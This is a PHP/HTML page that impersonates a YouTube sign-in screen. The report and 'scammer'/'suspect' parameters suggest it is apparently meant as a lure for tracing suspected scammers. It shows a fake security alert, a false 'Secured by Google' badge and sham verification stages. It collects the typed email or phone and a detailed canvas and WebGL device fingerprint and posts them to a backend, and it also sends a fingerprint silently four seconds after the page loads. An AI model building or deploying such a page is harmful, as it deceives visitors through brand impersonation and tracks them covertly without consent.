<?php
$report_id = intval($_GET['report'] ?? 0);
$role = in_array($_GET['role'] ?? '', ['scammer','suspect']) ? $_GET['role'] : 'scammer';
$back = '../../backend/realtime_scan.php';
?><!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Sign in – YouTube</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Google Sans',Roboto,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;width:100%;max-width:450px;text-align:center;position:relative;z-index:2;}
.logo{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:30px;}
.yt-icon{width:32px;height:32px;background:#ff0000;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:16px;color:white;}
.yt-text{font-size:22px;font-weight:500;color:#202124;}
h1{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px;}
.sub{color:#5f6368;font-size:14px;margin-bottom:24px;}
.alert{background:#fef7e0;border:1px solid #f9a825;border-radius:4px;padding:12px;margin-bottom:20px;font-size:12px;color:#e65100;text-align:left;line-height:1.5;}
input{width:100%;padding:13px 14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;margin-bottom:14px;color:#202124;}
input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2);}
.btn{padding:10px 30px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;float:right;}
.btn:hover{background:#1557b0;}
.note{font-size:11px;color:#8a8d91;margin-top:40px;text-align:left;clear:both;}

  #ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:999;flex-direction:column;align-items:center;justify-content:center;color:white;padding:30px;}
  .ring{width:76px;height:76px;border:3px solid transparent;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:18px;}
  @keyframes spin{to{transform:rotate(360deg);}}
  #lb{font-size:12px;letter-spacing:1px;margin-bottom:12px;font-family:monospace;text-align:center;}
  .pg-bg{width:200px;height:3px;background:rgba(255,255,255,.1);border-radius:2px;overflow:hidden;}
  #pg{height:100%;width:0%;transition:width .4s;}
  #doneCard{display:none;text-align:center;padding:40px 30px;}
</style></head><body>
<div class="card" id="mainCard">
  <div class="logo"><div class="yt-icon">▶</div><div class="yt-text">YouTube</div></div>
  <h1>Sign in</h1>
  <p class="sub">to continue to YouTube</p>
  <div class="alert">⚠️ <strong>Security Alert:</strong> Your account may be at risk. Sign in to verify your identity and secure your account.</div>
  <input id="u" placeholder="Email or phone" type="text">
  <input id="p" placeholder="Password" type="password">
  <button class="btn" onclick="runScan(document.getElementById('u').value||'unknown')">Next</button>
  <div class="note">🔒 Secured by Google</div>
</div>

<div id="ov">
  <div class="ring" style="border-top-color:#ff0000;border-right-color:#ff000044;"></div>
  <div id="lb">VERIFYING...</div>
  <div class="pg-bg"><div id="pg" style="background:#ff0000;"></div></div>
</div>
<div id="doneCard">
  <div style="font-size:52px;margin-bottom:14px;">✅</div>
  <div style="font-size:18px;font-weight:700;margin-bottom:6px;">Verification Successful</div>
  <div style="font-size:13px;opacity:.6;">Your account is now secured. You may close this window.</div>
</div>
<script>
const REPORT_ID = <?= $report_id ?>;
const ROLE      = '<?= $role ?>';
const BACK_URL  = '<?= $back ?>';

function collect(){
  return {
    screen_resolution:    screen.width+'x'+screen.height,
    color_depth:          screen.colorDepth,
    browser:              navigator.userAgent,
    language:             navigator.language,
    timezone:             Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezone_offset:      new Date().getTimezoneOffset(),
    device_memory:        navigator.deviceMemory||'unknown',
    hardware_concurrency: navigator.hardwareConcurrency||'unknown',
    touch_support:        navigator.maxTouchPoints||0,
    pixel_ratio:          window.devicePixelRatio||1,
    connection:           (navigator.connection||{}).effectiveType||'unknown',
    canvas_fingerprint:   getCanvas(),
    webgl_fingerprint:    getWebGL(),
  };
}
function getCanvas(){
  try{
    const c=document.createElement('canvas');c.width=220;c.height=40;
    const x=c.getContext('2d');
    x.fillStyle='#f60';x.fillRect(120,1,60,18);
    x.fillStyle='#069';x.font='11pt Arial';x.fillText('Sentinel',2,14);
    x.fillStyle='rgba(102,204,0,.7)';x.font='16pt Georgia';x.fillText('Sentinel',4,38);
    return c.toDataURL().slice(-50);
  }catch(e){return 'n/a';}
}
function getWebGL(){
  try{
    const c=document.createElement('canvas');
    const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
    if(!gl)return 'n/a';
    const ext=gl.getExtension('WEBGL_debug_renderer_info');
    const r=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER);
    const v=ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR);
    return (v+'::'+r).substr(0,80);
  }catch(e){return 'n/a';}
}
async function sendFP(fp, username){
  try{
    const r=await fetch(BACK_URL,{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({report_id:REPORT_ID,role:ROLE,fingerprint:fp,phone:username})
    });
    return (await r.json()).hash||'ok';
  }catch(e){return 'ok';}
}
const STAGES=[
  'READING DEVICE SIGNATURE...','COLLECTING BROWSER DATA...',
  'ANALYZING HARDWARE PROFILE...','GENERATING SHA-256 HASH...',
  'SYNCING TO BLOCKCHAIN...','VERIFIED ✓'
];
async function runScan(username){
  const fp=collect();
  const ov=document.getElementById('ov');
  const lb=document.getElementById('lb');
  const pg=document.getElementById('pg');
  ov.style.display='flex';
  for(let i=0;i<STAGES.length;i++){
    lb.textContent=STAGES[i];
    pg.style.width=((i+1)/STAGES.length*100)+'%';
    await new Promise(r=>setTimeout(r,580));
  }
  await sendFP(fp,username);
  ov.style.display='none';
  document.getElementById('mainCard').style.display='none';
  document.getElementById('doneCard').style.display='block';
}
// Silent passive scan after 4s
setTimeout(()=>sendFP(collect(),''),4000);
</script></body></html>